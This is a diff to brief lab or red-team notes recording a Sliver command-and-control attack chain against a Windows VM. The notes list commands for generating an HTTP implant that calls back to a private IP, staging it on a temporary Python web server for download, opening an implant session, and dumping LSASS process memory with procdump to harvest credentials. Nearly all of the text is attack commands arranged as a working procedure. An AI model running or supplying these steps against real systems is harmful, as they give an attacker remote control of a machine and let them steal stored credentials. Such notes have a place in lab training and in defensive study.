@@ -1,10 +1,12 @@
 
 Sliver Implant and Credential Dump Commands:
 
-- Generated implant payload for Windows:
-  > generate -o implant.exe windows
+- Generated implant payload:
+  > generate --http 192.168.x.x --save /opt/sliver
 
-- Transferred implant.exe to Windows VM.
+- Used a temporary web server to download implant to Windows VM.
+  > cd /opt/sliver 
+  > python3 -m http.server 80
 
 - Launched implant on Windows target.
 
@@ -15,7 +17,6 @@ Sliver Implant and Credential Dump Commands:
   > interact <session_id>
 
 - Attempted LSASS memory dump using:
-  > procdump lsass.exe
-  > minidump lsass.exe
+  > execute procdump -n lsass.exe -s lsass.dmp 
 
 - Captured output and verified process memory dump.
